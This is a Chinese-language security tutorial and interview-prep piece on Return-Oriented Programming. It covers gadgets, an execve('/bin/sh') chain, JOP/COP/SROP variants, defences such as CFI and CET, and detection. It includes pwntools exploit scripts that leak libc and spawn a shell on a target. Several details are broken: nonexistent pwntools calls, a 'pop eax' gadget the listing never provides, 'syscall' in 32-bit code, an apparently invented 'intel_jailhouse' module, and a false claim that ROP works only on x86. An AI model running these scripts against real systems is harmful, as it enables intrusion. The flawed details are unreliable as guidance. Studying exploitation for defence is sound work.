# ROP：绕过 NX 的艺术

你给程序加上了 NX 保护（栈不可执行）。

攻击者无法直接在栈上运行 shellcode 了。

但攻击者发现了新方法——**Return-Oriented Programming（返回导向编程）**。

ROP 让攻击者在已有的代码片段中找到「零件」，拼接成完整的攻击逻辑。

## ROP 的核心思想

### NX 保护的绕过

```
传统攻击（栈溢出）：
[padding][NOP slide][shellcode][return addr]
           ↑
           跳转到这里执行

ROP 攻击：
[padding][addr1][addr2][addr3][addr4]...
              ↑      ↑      ↑
              返回地址指向已有的代码片段（gadget）
```

### Gadget 的概念

```c
// 源码
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 溢出！
}

int main() {
    vulnerable_function(user_input);
    return 0;
}
```

编译后，程序中有很多「有用」的代码片段：

```asm
# 这些是被攻击者「回收」的代码片段

# Gadget 1: pop ebx; ret
0x080484a0: pop ebx
0x080484a1: ret

# Gadget 2: pop ecx; pop ebx; ret
0x080484b0: pop ecx
0x080484b1: pop ebx
0x080484b2: ret

# Gadget 3: add eax, ebx; ret
0x080484c0: add eax, ebx
0x080484c2: ret

# Gadget 4: mov [ecx], eax; ret
0x080484d0: mov [ecx], eax
0x080484d3: ret

# Gadget 5: syscall
0x080484e0: syscall
0x080484e2: ret
```

### ROP 链的构建

```
攻击目标：执行 execve("/bin/sh", NULL, NULL)

ROP 链：
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  [addr of "pop eax; ret"]  ← 设置系统调用号（11 = execve） │
│  [0x0b]                                                    │
│  [addr of "pop ebx; ret"]  ← 第一个参数（"/bin/sh" 地址）  │
│  ["/bin/sh address"]                                         │
│  [addr of "pop ecx; ret"]  ← 第二个参数（NULL）            │
│  [0x00000000]                                               │
│  [addr of "pop edx; ret"]  ← 第三个参数（NULL）            │
│  [0x00000000]                                               │
│  [addr of "syscall"]    ← 执行系统调用                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## ROP 变体

### 1. JOP（Jump-Oriented Programming）

不是返回跳转，而是通过间接跳转：

```asm
# JOP 使用跳转表
jmp [ebx+0x10]  ; ebx 指向攻击者控制的结构
```

### 2. COP（Call-Oriented Programming）

通过调用指令链：

```asm
call [eax+4]
add esp, 4
call [eax+8]
```

### 3. SROP（Sigreturn-Oriented Programming）

利用信号处理机制：

```asm
# 信号返回会从栈上恢复寄存器
# 攻击者可以伪造整个寄存器上下文
sigreturn()
```

## 现实中的 ROP

### libc 地址获取

```python
# 使用 pwntools 构造 ROP 链
from pwn import *

# 连接目标程序
p = remote('target', 12345)

# 获取 libc 地址（通过泄露或格式化字符串漏洞）
libc_base = p.libc.address

# 构造ROP链
rop = ROP(libc_base)
rop.system(next(libc.search('/bin/sh')))  # system("/bin/sh")

# 发送payload
p.sendline(b'A' * 64 + rop.chain())
p.interactive()
```

### 完整利用示例

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

# 启动进程
p = process('./vulnerable_program')

# 获取信息
elf = ELF('./vulnerable_program')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# 创建 ROP 对象
rop = ROP([elf, libc])

# 泄露 libc 地址（假设存在格式化字符串漏洞）
p.sendline(b'%15$p')  # 泄露某个栈上的地址
leak = int(p.recvline(), 16)
libc.address = leak - libc.symbols['__libc_start_main'] - 247

log.info(f"Libc base: {hex(libc.address)}")

# 构建 ROP 链执行 system("/bin/sh")
rop.system(next(libc.search(b'/bin/sh')))

# 发送溢出 payload
payload = b'A' * 64  # 填充到返回地址
payload += rop.chain()

p.sendline(payload)
p.interactive()
```

## 防御措施

### 1. 栈不可执行（NX）

```bash
# 编译时启用 NX
gcc -z execstack -o program program.c  # 禁用 NX（测试用）
gcc -o program program.c              # 默认启用 NX
```

### 2. 完整 RELRO

```bash
# 编译时启用完全 RELRO
gcc -z relro -z now -o program program.c

# Partial RELRO：GOT 部分可写
# Full RELRO：GOT 完全只读，攻击者无法覆写 GOT
```

### 3. 栈保护 + ASLR + CFI

```bash
# 完整保护
gcc -fstack-protector-strong \
    -fPIE -pie \
    -z relro -z now \
    -D_FORTIFY_SOURCE=2 \
    -o program program.c

# _FORTIFY_SOURCE 在运行时检查边界
```

### 4. 控制流完整性（CFI）

```c
// 编译器插入间接调用的完整性检查
__cfi_check(uintptr_t target, uintptr_t type_id) {
    if (!is_valid_call_target(target)) {
        __builtin_trap();  // 非法调用时终止
    }
}
```

### 5. Intel CET（Control-flow Enforcement Technology）

```bash
# 硬件层面的控制流完整性
# 影子栈：保存返回地址副本
# ENDBR 指令：标记合法的间接调用目标
```

## JavaScript 引擎 ROP

现代浏览器的 JavaScript 引擎也会遭受 ROP 攻击：

```javascript
// V8 JIT 喷射
// JIT 编译的代码页是可执行的
// 攻击者利用 JIT 喷射在代码页中放置 shellcode
// 结合 ROP 绕过 ASLR
```

```c
// 攻击流程
// 1. 通过 WebAssembly 或 JIT 创建可执行内存区域
// 2. 在该区域喷射 shellcode
// 3. 利用漏洞泄漏代码地址
// 4. 构建 ROP 链，跳转到 shellcode
```

## 检测 ROP

### 运行时检测

```c
#include <signal.h>

// 检测 ROP 特征
void detect_rop() {
    // 检查返回地址是否来自栈
    uintptr_t return_addr;
    __asm__ volatile ("movl (%%esp), %0" : "=r"(return_addr));
    
    // 检查是否在可疑范围内
    if (is_on_stack(return_addr) && is_executable(return_addr)) {
        // 可能正在执行 ROP
        raise(SIGKILL);
    }
}
```

### 统计检测

```python
# 检测异常的指令执行模式
# ROP gadget 通常很短（2-3 条指令）
# 频繁的短返回意味着可能正在执行 ROP

import intel_jailhouse as ij

# 使用硬件性能计数器检测
ij.monitor_instructions(['ret'], threshold=10000)
```

## 面试追问方向

1. **ROP 为什么能绕过 NX？** —— ROP 利用已有的代码片段，不是执行栈上的数据
2. **ROP gadget 是什么？** —— 以 ret 结尾的短指令序列，可以拼接成复杂逻辑
3. **为什么 ROP 只在 x86 上有效？** —— x86 的可变长度指令编码使 gadget 丰富；ARM 等 RISC 架构 gadget 较少
4. **如何防御 ROP？** —— CFI、影子栈、CET、完整 RELRO、堆栈不可执行
5. **JIT 喷射是什么？** —— 在 JIT 编译的可执行内存页中喷射 shellcode，结合 ROP 使用

> "ROP 是攻击者与防御者博弈的产物。理解它的原理，才能设计出有效的防御机制。"
